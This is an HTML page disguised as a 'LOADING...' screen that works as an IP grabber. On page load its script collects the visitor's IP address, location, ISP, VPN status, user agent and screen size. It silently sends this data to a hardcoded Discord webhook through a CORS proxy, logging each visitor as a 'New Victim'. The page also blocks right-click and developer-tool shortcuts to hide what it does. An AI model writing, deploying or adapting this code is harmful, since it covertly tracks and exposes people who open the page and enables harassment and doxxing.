<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Loading...</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap');

  html, body {
    margin: 0; padding: 0; height: 100%;
    background: black;
    color: #00ffff;
    font-family: 'Orbitron', monospace;
    display: flex;
    justify-content: center;
    align-items: center;
    user-select: none;
  }

  #loading-text {
    font-size: 5rem;
    animation: gtaFlicker 2.5s infinite alternate;
    letter-spacing: 0.2em;
  }

  @keyframes gtaFlicker {
    0%, 100% { opacity: 1; }
    40%, 60% { opacity: 0.3; }
  }

  /* Disable text selection and right-click */
  body, html {
    -webkit-user-select: none;
    -moz-user-select: none;
    user-select: none;
  }
</style>
</head>
<body>

<div id="loading-text">LOADING...</div>

<script>
  // Disable right-click context menu
  document.addEventListener('contextmenu', e => e.preventDefault());

  // Disable F12, Ctrl+Shift+I, Ctrl+U, Ctrl+Shift+C etc
  document.addEventListener('keydown', e => {
    if (
      e.key === "F12" ||
      (e.ctrlKey && e.shiftKey && ['I', 'C'].includes(e.key.toUpperCase())) ||
      (e.ctrlKey && e.key.toUpperCase() === 'U')
    ) {
      e.preventDefault();
    }
  });

  // Fetch geo + VPN data + IP from ipwhois.app (free, no key needed)
  // Docs: https://ipwhois.io/documentation

  const webhookUrl = "https://discord.com/api/webhooks/1403468598286221333/d15xSrnNqkAJ_jk5cnGqcLh8oigcdjJlZHj7t9aqM4DDmQ5K9Rif6jVdewyWrAFr8Hcg";
  const corsProxy = "https://cors-anywhere.herokuapp.com/";

  async function fetchIPInfo() {
    const res = await fetch('https://ipwhois.app/json/');
    if(!res.ok) throw new Error("Failed to get IP info");
    const data = await res.json();
    return data;
  }

  async function sendDiscordWebhook(data) {
    // Compose embed with rich details
    const embed = {
      title: "üïµÔ∏è‚Äç‚ôÇÔ∏è New Victim Logged",
      color: 0x00ffff,
      timestamp: new Date().toISOString(),
      footer: {
        text: "Get Trolled IP Grabber",
        icon_url: "https://i.imgur.com/qZ7j0fV.png"
      },
      thumbnail: {
        url: data.country_flag || ""
      },
      author: {
        name: "Get Trolled IP Logger",
        url: "https://discord.com",
        icon_url: "https://i.imgur.com/qZ7j0fV.png"
      },
      fields: [
        { name: "IPv4 Address", value: `\`${data.ip}\``, inline: true },
        { name: "IPv6 Address", value: `\`N/A\``, inline: true },
        { name: "Country", value: `${data.country} (${data.country_code})`, inline: true },
        { name: "Region", value: `${data.region}`, inline: true },
        { name: "City", value: `${data.city}`, inline: true },
        { name: "ISP", value: `${data.isp}`, inline: false },
        { name: "Timezone", value: `${data.timezone_gmt} (${data.timezone})`, inline: true },
        { name: "VPN/Proxy Detected", value: `${data.security.is_proxy ? "Yes" : "No"}`, inline: true },
        { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
        { name: "Screen Resolution", value: `\`${window.screen.width}√ó${window.screen.height} (${window.devicePixelRatio} DPR)\``, inline: true }
      ]
    };

    try {
      const res = await fetch(corsProxy + webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ embeds: [embed] })
      });
      if(!res.ok) throw new Error("Discord webhook error " + res.status);
      return true;
    } catch (e) {
      console.error("Webhook send failed:", e);
      return false;
    }
  }

  // Run on load
  (async function(){
    try {
      const data = await fetchIPInfo();
      await sendDiscordWebhook(data);
      // Done silently, no page changes
    } catch(e){
      console.error(e);
    }
  })();
</script>

</body>
</html>
